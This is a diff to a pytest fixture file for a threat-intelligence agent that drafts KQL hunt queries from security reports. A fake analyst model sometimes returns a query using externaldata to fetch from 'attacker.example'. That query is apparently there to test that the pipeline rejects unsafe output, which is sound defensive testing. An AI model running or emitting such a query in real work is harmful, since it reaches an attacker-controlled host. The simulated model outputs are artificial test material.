@@ -1,3 +1,4 @@
+import re
 from dataclasses import dataclass, field
 from pathlib import Path
 
@@ -5,15 +6,20 @@ import pytest
 
 from cti_agent.attack.attack_index import AttackIndex
 from cti_agent.config import Settings
-from cti_agent.llm.client import LLMResult
+from cti_agent.llm.client import LLMResult, ReplayClient
 from cti_agent.models import (
+    Confidence,
     Evidence,
     ExtractedActor,
     ExtractedCVE,
     ExtractedIndicator,
     ExtractedTechnique,
     Extraction,
+    HuntDraft,
+    ReviewScores,
 )
+from cti_agent.outputs.brief_out import LeadershipSummary
+from cti_agent.pipeline import run_ingest
 from cti_agent.stages.validator import Allowlist
 from cti_agent.util.normalise import match_key
 
@@ -91,7 +97,7 @@ class FakeModel:
     stop_reason: str = "end_turn"
     calls: list[str] = field(default_factory=list)
 
-    def structured(self, *, model, system, user, schema, max_tokens, effort=None):
+    def structured(self, *, model, system, user, schema, max_tokens, effort=None, **kwargs):
         self.calls.append(user)
         if self.stop_reason != "end_turn":
             return LLMResult(None, self.stop_reason, len(user) // 4, 0, 5, model, "simulated")
@@ -121,7 +127,86 @@ def settings(tmp_path) -> Settings:
         attack_bundle=FIXTURES / "attack-mini.json",
         attack_mobile_bundle=FIXTURES / "attack-mobile-v20-subset-aa23-320a.json",
         allowlist_file=ROOT / "data" / "allowlist.txt",
+        rules_file=ROOT / "data" / "my_rules.sample.csv",
+        kql_schema_file=ROOT / "data" / "kql_schema.json",
     )
+
+
+AA23_REPORT = FIXTURES / "reports" / "aa23-320a.txt"
+AA23_RECORDED = FIXTURES / "llm" / "aa23-320a"
+AA23_ATTACK = (
+    FIXTURES / "attack-v20-subset-aa23-320a.json",
+    FIXTURES / "attack-mobile-v20-subset-aa23-320a.json",
+)
+
+
+@pytest.fixture(scope="session")
+def aa23_attack() -> AttackIndex:
+    return AttackIndex(*AA23_ATTACK)
+
+
+@pytest.fixture
+def aa23_run(settings, aa23_attack):
+    """A fresh ingest of AA23-320A from the recorded model output; returns its run ID."""
+    result = run_ingest(
+        AA23_REPORT, "CLEAR", settings, ReplayClient(AA23_RECORDED), attack=aa23_attack
+    )
+    return result.run_id
+
+
+_HUNT_QUERY = """DeviceProcessEvents
+| where Timestamp > ago(7d)
+| where InitiatingProcessFileName =~ "anydesk.exe"
+| project Timestamp, DeviceName, FileName, ProcessCommandLine"""
+_EXFIL_QUERY = """externaldata(x:string) [@"https://attacker.example/collect"]
+| take 1"""
+
+
+@dataclass
+class FakeAnalyst:
+    """Stands in for the analyst, reviewer and brief models, keyed on the schema asked for."""
+
+    bad_query_for: set[str] = field(default_factory=set)  # these get an externaldata query
+    low_scores_for: set[str] = field(default_factory=set)
+    refuse: set[str] = field(default_factory=set)
+    summary: list[str] | None = None
+    calls: list[tuple[str, str]] = field(default_factory=list)
+
+    def structured(self, *, model, system, user, schema, max_tokens, effort=None, **kwargs):
+        self.calls.append((schema.__name__, user))
+        if schema is HuntDraft:
+            tid = re.search(r"Technique: (T\d{4}(?:\.\d{3})?)", user).group(1)
+            if tid in self.refuse:
+                return LLMResult(None, "refusal", 900, 0, 5, model, "simulated refusal")
+            quote = re.search(r"<untrusted_report>\n- (.*)", user).group(1)
+            draft = HuntDraft(
+                title=f"Hunt for {tid}",
+                technique_id=tid,
+                tables=["DeviceProcessEvents"],
+                query=_EXFIL_QUERY if tid in self.bad_query_for else _HUNT_QUERY,
+                evidence_quotes=[quote],
+                expected_false_positives=["IT support using remote tools"],
+                tuning_notes="Exclude approved RMM tools.",
+                assumptions=[],
+                confidence=Confidence(score=40, rationale="Broad behavioural match."),
+            )
+            return LLMResult(draft, "end_turn", 2000, 600, 5, model)
+        if schema is ReviewScores:
+            tid = re.search(r"Technique: (\S+)", user).group(1)
+            low = tid in self.low_scores_for
+            scores = ReviewScores(
+                faithful=4, kql_correct=2 if low else 4, actionable=4, calibrated=3,
+                reasons=["grounded", "valid", "runnable", "fair"],
+            )  # fmt: skip
+            return LLMResult(scores, "end_turn", 1500, 300, 5, model)
+        if schema is LeadershipSummary:
+            sentences = self.summary or [
+                "Scattered Spider tricks help desks into resetting passwords.",
+                "Our rules cover part of what they do.",
+                "Draft hunts are waiting for an analyst to review them.",
+            ]
+            return LLMResult(LeadershipSummary(sentences=sentences), "end_turn", 400, 120, 5, model)
+        raise AssertionError(f"unexpected schema {schema}")
 
 
 @pytest.fixture(scope="session")
